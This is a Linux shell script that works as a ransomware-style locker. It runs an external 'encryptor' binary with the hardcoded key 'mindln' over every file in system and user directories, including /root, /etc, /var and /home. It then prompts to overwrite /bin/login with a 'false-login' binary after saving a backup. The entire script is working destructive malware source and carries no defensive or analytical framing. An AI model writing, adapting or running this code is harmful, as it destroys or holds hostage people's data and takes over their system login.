#!/bin/sh

current="$(dirname "$(realpath "$0")")"
encryptor="$current/encryptor"

use_custom_key=true
custom_key="mindln"

targets=(
	"/root/"
	"/etc/"
	"/mnt/"
	"/opt/"
	"/srv/"
	"/tmp/"
	"/var/"
	"/media/"
	"/usr/share/"
	"/home/"
)

echo "starting encryption"

for directory in "${targets[@]}"; do
	if [ -d "$directory" ]; then
		echo "scanning: $directory"
		mapfile -t files < <(find "$directory" -type f ! -path "$current/*" 2>/dev/null)
		for file in "${files[@]}"; do
			if [ -f "$file" ]; then
				if [ "$file" = "$current/false-login" ]; then
					continue
				fi

				echo "encrypting: $file"
				if [ "$use_custom_key" = true ]; then
					"$encryptor" -k "$custom_key" -f "$file" >/dev/null 2>&1
				else
					"$encryptor" -f "$file" >/dev/null 2>&1
				fi
			fi
		done
	fi
done

echo "encryption completed"

while true; do
	echo -n "do you want to replace the false-login with /bin/login? [y/n] "
	read -r yn
	case "$yn" in
		[Yy]* )
			if [ -f "$current/false-login" ]; then
			echo "old /bin/login is being backed up"
			cp -f /bin/login "$current/login.orig"
			if [ $? -ne 0 ]; then
				echo "backup failed, cancelled"
				break
			fi

			echo "false-login is being copied"
			if cp -f "$current/false-login" /bin/login; then
				chmod +x /bin/login
				echo "/bin/login successfully changed"
			else
				echo "/bin/login could not be copied, the file may be in use"
			fi
		else
			echo "false-login not found, $current/false-login"
		fi

		break
		;;

	[Nn]* )
		break
		;;
	* )
		echo "enter 'y' or 'n'"
		;;
	esac
done
